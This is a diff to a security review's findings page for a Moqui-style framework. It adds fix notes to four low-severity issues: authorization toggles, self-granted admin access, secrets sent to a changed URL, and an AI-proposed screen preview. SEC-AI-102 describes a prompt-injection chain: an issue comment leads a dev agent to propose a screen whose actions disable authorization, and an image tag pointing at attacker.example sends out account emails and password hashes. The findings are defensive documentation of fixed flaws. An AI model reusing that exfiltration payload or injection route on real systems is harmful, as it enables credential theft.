@@ -50,8 +50,17 @@ The Low and Info findings of the [security review](Security-Review.md), by area,
 
 #### SEC-RTE-92. A screen action's or a script run's `disableAuthz()`, `disableEntityEca()` or `disableTarpit()` lasts for the rest of the request
 
-Low; reported (confirmed in code).
+Low; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-19 (mr-moqui 4d8162496, 1e1401fba).
+  - These now run under `ExecutionContext::keep_authz`, so whatever they disable (authorization, entity ECA rules, tarpit counting) ends with them:
+    - every screen action block;
+    - every `ec.resource` script, expand, expandNoL10n, expression and condition;
+    - the webapp lifecycle actions;
+    - ECA rules' inline conditions and actions;
+    - every template run, and each separate widget expression of a render.
+  - One scope costs about 121 ns. A 200-row form-list render measured within noise of the run without the scope.
+  - **Tests:** `an_action_blocks_authorization_toggles_end_with_it`, `a_script_runs_authorization_toggles_end_with_it`, `a_resource_expression_ends_what_it_disables`, `a_rules_condition_and_actions_end_what_they_disable`, `a_widget_expressions_disable_ends_with_it` and `a_lifecycle_actions_toggles_end_with_them`. Each fails without the fix.
 - **Where:** `crates/moqui-core/src/screen/render.rs:1113-1121` (always-actions), `:1157-1166` (pre-actions), and every other `actions.run()` of a render (`:2001`, `:2262`, `:2718`); `crates/moqui-core/src/context/factory.rs:1420-1437` (`script_disable_authz`: held "until `script_enable_authz`, the end of the `AuthzScope` it runs in, or the end of the context"), `:1447`, `:1462`; `crates/moqui-core/src/script/oxide/resource.rs:106-167` (`ec.resource.script` runs the file in the caller's scope); `crates/moqui-core/src/context/artifact.rs:448-465` (`scope_authz`, taken only by `service/call.rs:518`, `service/shell.rs:211` and `screen/shell.rs:1481`).
 - **Reached by:** component code: a screen's actions, a transition's actions or a library that `ec.resource.script()` loads, which calls `disableAuthz()`, `disableEntityEca()` or `disableTarpit()` and, on a path that throws or returns early, never sets it back. Every shipped screen use checked (about 50, `webroot.xml:280`, `PeopleMyPayslip.xml:38`, `Sprints.xml:39`, `CostingPolicies.xml:107` and the rest) puts it back in a `finally`, so this is hardening.
 - **What happens:** The 2026-11-18 fix gave every service call an `AuthzScope` that puts the caller's authorization state back on any exit. A render has no such scope. A script's `disableAuthz()` guard stays in the context's `script_authz` until the context ends. For the rest of the request, every later action, form-list and widget find, and every nested service call then runs with authorization off: `keep_authz` keeps the depth, and `entity_filters_apply` (`user/filter.rs:74-78`) answers false. So entity filters are off too. `disableEntityEca()` leaves no entity ECA rule at all (`eca.rs:66`): the `UserSecurityChecks` asserts are skipped as well (privileged membership, sealed grants, stored templates), although a load's own switch keeps them. Scenario: a parent screen's always-action disables authorization for one lookup and throws before it enables it again inside a `try` without `finally` that the screen catches. Every subscreen and list of that render then shows rows of every organization to the user.
@@ -74,8 +83,28 @@ Low; reported (confirmed in code).
 
 #### SEC-ADM-90. An access administrator gives themselves any bundle they may delegate, with no second person
 
-Low; reported (confirmed in code).
+Low; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-19 (mr-moqui 325935695, 2cde1f51c, d98716cd8, d8faf6aeb, 12f96b427).
+  - **Own membership.** `store#Membership` and `apply#GrantProposal` refuse the caller's own account (OWN_ACCOUNT, `ownPrivilegedRefusal` in `Access.js`) for a group that:
+    - is privileged;
+    - grants a sealed permission;
+    - registers a CpkSensitive capability; or
+    - currently grants something sensitive the caller does not hold (`unheldSensitive`): a sealed or CpkSensitive permission, or an allowing artifact binding that a CpkSensitive bundle registers and no plain bundle registers as far. "As far" means the same type (or ALWAYS), the same action (or ALL), and no row rule the binding lacks. A registration's unset type and action read as ALLOW and ALL.
+    This covers a new own membership and one kept longer; ending or shortening one is allowed.
+  - **Held bindings.** A binding counts as held through one of the caller's groups that reaches as far.
+  - **Plain bundles.** A plain reader bundle stays self-assignable (SEC-ADM-06), with the reason audit-logged.
+  - **Own group.** `grantPreview`, and so `apply#Grants`, refuses any permission or binding added to a group the caller is in now or from a later date (OWN_GROUP).
+  - **ADMIN exemption.** A member of ADMIN is exempt from both rules, and each such change carries "[own access, ADMIN member]" in its audit reason.
+  - **Sign-in role mappings.** A mapping to a bundle with a sensitive capability is refused (SENSITIVE_BUNDLE, `ConfigurationProviders.js`) unless the actor is in ADMIN.
+  - **Tests:** `AdminAccessServices.spec.js` covers:
+    - privileged, sealed and CpkSensitive bundles;
+    - grant-first-then-join;
+    - plain readers allowed;
+    - OWN_GROUP, including a future-dated membership;
+    - the ADMIN exemption with its audit mark;
+    - a reader bundle's VIEW registration not covering an ALL binding.
+    `AdminIdentityProviders.spec.js` covers SENSITIVE_BUNDLE. Each fails without its fix.
 - **Where:** `runtime/components/base/framework/service/org/moqui/admin/Access.js:507-571` (`storeMembership`: `:533` reads the account and never compares it with `ec.user.userId`), `:1100-1103` (`OWN_ACCOUNT`, only in `applyGrantProposal` and only for a caller without `ADMIN_ACCESS_MANAGE`), `:828-862` (`applyGrants`, on a group the caller is in as on any other); `runtime/components/addon/mr-boss/screen/Admin/Users/UserDetail.xml:89-102`.
 - **Reached by:** a holder of `ADMIN_ACCESS_MANAGE` (`BOSS_ADMIN_ACCESS` in mr-boss, scoped to their organizations).
 - **What happens:** The access administrator adds their own account to any registered bundle whose `delegablePermissionId` they hold, or to a custom group, and can first grant that group a bundle's permissions. Every app administrator bundle names `ADMIN_ACCESS_MANAGE`. The audit log records the change with the reason given, and no second person is asked. Scenario: the access administrator of one organization makes themselves `BOSS_PEOPLE_ADMIN` and reads that organization's HR records and payroll setup, which their role is meant to grant to others, not to hold. Since SEC-BOS-84 the sealed `*_ALL_ORGANIZATIONS` permissions keep this inside their own organizations.
@@ -116,8 +145,19 @@ Low; reported (confirmed in code).
 
 #### SEC-TLS-116. A model endpoint's API key and an entity sync's password go to a new URL with no new secret
 
-Low; reported (confirmed in code).
+Low; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-19 (mr-moqui 7dc293eb1, deec6a942).
+  - **The rule.** Run-before entity ECA rules (`Security.eecas.xml` `*SecretMoves`, `admin/EndpointSecrets.js` `moved`) apply on every write path. A new address clears the stored secrets unless a new secret is written in the same save, and a message says so. The stored value written back counts as no new secret.
+  - **Records covered:**
+    - LlmEndpoint and EntitySync, ADMIN only;
+    - SystemMessageRemote;
+    - ScrapeTarget;
+    - EmailServer, where a change to or from `edge:` keeps the passwords;
+    - AgentMcpServer and AgentRemoteA2a, compared by origin.
+  - **Exemption.** Only seed and install loads are exempt. Tools Data Load (with its ServiceJob path), an entity sync's put, a request text load and services with authorization disabled all apply the rule.
+  - **Screens.** EntitySyncDetail takes the password as a password field (empty keeps it) and shows whether one is set. EndpointDetail lists which changes clear the key.
+  - **Tests:** `EndpointSecrets.spec.js` has three features (the screens' services, plain writes, restricted vs seed loads), each failing without the fix. `system_sync` and `git_hosting` now write the secret with or after the new address.
 - **Where:** `crates/moqui-llm/src/registry.rs:204-224` (a row's own `apiKey` is kept when `baseUrl` changes; only the conf's key is held back for another origin, `:206-217`); `runtime/components/base/tools/screen/System/Llm/Models/EndpointDetail.xml:24-27` (`storeEndpoint`, a plain `store#moqui.llm.LlmEndpoint`); `runtime/components/base/tools/screen/System/EntitySync/EntitySyncDetail.xml:20-21` (`update#moqui.entity.sync.EntitySync`); `crates/moqui-core/src/service/system_sync/entity_sync.rs:505-511` (`targetPassword` sent as Basic to `targetServerUrl`). The rule they lack is in `runtime/components/base/framework/service/org/moqui/admin/ConfigurationConnections.js:13-16`, `:387-396`.
 - **Reached by:** a user of System › LLM › Models or System › Entity Sync (`ADMIN` by seed), or a stolen session of one.
 - **What happens:** Both secrets are encrypted, and the screens never show them (`targetPasswordIsSet`, `apiKeyMasked`). They are write-only, as the connection secrets of ConfigurationConnections are. Those connections clear the stored secrets when an endpoint field changes, unless new ones are entered in the same save, and save the connection disabled until a test passes. Here, changing `baseUrl` or `targetServerUrl` alone sends the stored key or password to the new host on the next model call or sync push. Scenario: someone with a few minutes in an administrator's session points the production LLM endpoint at `https://collector.example` and receives the provider API key with the next chat. Or they point an entity sync at their host and receive the remote instance's sync password.
@@ -157,8 +197,70 @@ Low; reported (confirmed in code).
 
 #### SEC-AI-102. A previewed `screen-xml` canvas's actions read any record with authorization off, and the preview's policy lets an image carry it out (the remainder of SEC-AI-82)
 
-Low; reported (likely).
+Low; reported (likely); fixed.
 
+- **Fix:** Fixed 2026-11-19 (mr-moqui 856fce090, 91a304194, c6fc0d7c6, 8ff691958, 72e3db3a8, 810633cf8, 5fb199ac7, adbca3502).
+  *Which screens count as proposed.*
+  - A screen is proposed when its own text or a screen-extend's stands at the overlay, or when it includes a form, section or transition from a proposed screen. Reading a proposed subscreen's file for its menu title does not count.
+  - A trusted form that `extends` a proposed form is marked proposed too.
+  - `proposed_running()` follows the artifact stack: the nearest screen frame above the last service frame. A service called from proposed text runs its own code normally.
+  - A proposed definition's actions, render, transitions and menu data run with authorization required.
+  *Refusals while the lock holds.*
+  - Every `disableAuthz`, login and logout, `runAsUser`, artifact push and pop, and `setEffectiveTime`.
+  - Raw SQL anywhere needs a service's own code, authorization disabled outside a render, or `SQL_RUNNER_WEB`.
+  *The preview runtime.*
+  - A preview renders on a script runtime of its own, let go afterwards.
+  - Frozen at its start: the built-in objects, `ec` and every facade under it, `sri`, the helpers and the global bindings.
+  - Frozen once made: host class prototypes and a mode's render functions.
+  - If a preview is requested inside a running script, the proposed text runs no code.
+  *The allow-list holds for the whole runtime.*
+  - While a preview holds the runtime, these run as a region on the region's list (`preview::allowed`), whoever's frame is on top, so the trusted shell's expansion of a proposed menu title is covered:
+    - every Condition, Value, FieldValue, Expand and Map entry;
+    - `ec.resource` expand, expandNoL10n, expression and condition;
+    - every actions snippet of a definition: a drop-down's `entity-options` find and a form-list's count find.
+  - A proposed screen's own actions are a region too.
+  - The region's list:
+    - entity finds and values, and service calls, with authorization applying and no `disableAuthz`;
+    - `ec.message`, `ec.l10n` and `ec.logger`;
+    - `ec.resource` expand, expression and condition, plus `script` at a `component://` location, which runs inside the same region;
+    - the context;
+    - `ec.user` reads;
+    - the pure helpers;
+    - `sri` reads and the URL builders;
+    - `ec.factory.getConfValue`;
+    - `ec.artifactExecution` `authzLocked`, `isPermitted` and `isPermittedOwn`.
+    Anything else is refused, and a returned value is copied out as data.
+  - The render units' own code, and a trusted screen's own actions block, run on the units' list (`preview::unit_allowed`). That list is:
+    - the region's list;
+    - `sri` writes;
+    - the request's reads and a data transition's JSON answer;
+    - the shell's conf, render-mode and `ec.llm.isEnabled` reads;
+    - authorization's own checks;
+    - form definitions;
+    - `component://` resources;
+    - the user's visit.
+    It has no raw response write.
+  *Proposed text never becomes code.*
+  - Each inline attribute of a proposed screen outside its action elements is replaced at load with `ec.resource.expression("…", "")`, its text escaped. Attributes covered: condition, hide, map, text-map, currency-unit-field, disable-condition, move-condition, and a report's variables, dashboard, frames, frame and panel.
+  - An attribute that is not exactly one JavaScript expression stops the screen loading, and the error does not echo it.
+  - A proposed name, id, type, size, height or width loses its markup characters. A proposed `default-menu-title` or `menu-title` is made literal (no markup, no `$`).
+  - Proposed text reads copies of the page's script and stylesheet lists and may not set one.
+  *Response and filters.*
+  - The preview response keeps `PREVIEW_POLICY`, drops `Refresh`, and turns a redirect to another site into a 403.
+  - Entity filters' apply conditions and maps read only `ec.user.context`.
+  - The real `/qapps` and `/apps` shells and their menu data render a preview.
+  *Tests:* in `screen/tests/render.rs`, `screen/tests/statics.rs`, `user/filter_tests.rs` and moqui-host `devaide.rs` (the real shell), covering:
+  - actions, widgets and login;
+  - SQL, file, cache and clock;
+  - the allowed members;
+  - frozen built-ins and poisoned host objects;
+  - form extends and menu data;
+  - inline expressions and splice breakouts;
+  - markup in names, page script lists and Refresh;
+  - definition finds and expansions as regions, and the form-list count;
+  - the parent shapes and component scripts;
+  - the preview policy and the filter context.
+  Each fails without its part of the fix.
 - **Where:** `crates/moqui-core/src/screen/render.rs:789-796` (a preview render: its own `Content-Security-Policy` of `frame-ancestors 'self'; form-action 'self';` and the read fence); `crates/moqui-core/src/script/host/tools.rs:2964-2970` (`disableAuthz()` asks nothing of the fence); `crates/moqui-core/src/user/filter.rs:74-78`; `crates/moqui-entity/src/entity/fence.rs:15-31` (the fence stops writes and server-side outbound calls, not reads).
 - **Reached by:** the reach of SEC-AI-82: text planted where a dev agent reads it, on an instance with `instance_purpose=dev`, for a user with a dev-aide permission who presses Show the preview.
 - **What happens:** After SEC-AI-82's fix the preview's client text is a placeholder, but the model-written screen's `<actions>` run on the server as the viewer. A script there may call `ec.artifactExecution.disableAuthz()` or `find(...).disableAuthz()`, which the fence allows, so it reads any entity with entity filters off (`UserAccount` rows, other users' messages, records of every organization) and puts them in the render. The preview's response policy replaces the conf's (`web::apply_conf_headers` keeps a response's own `Content-Security-Policy`), so it has no `img-src` or `default-src`. An `<image url="https://attacker.example/i?d=${...}" url-type="plain"/>` then sends what the actions read to another site as soon as the frame loads, with no click. Scenario: an issue comment the agent summarizes asks it to propose a screen. The developer presses Show the preview, and the page's image request carries the instance's account emails and password hashes to the attacker's host.
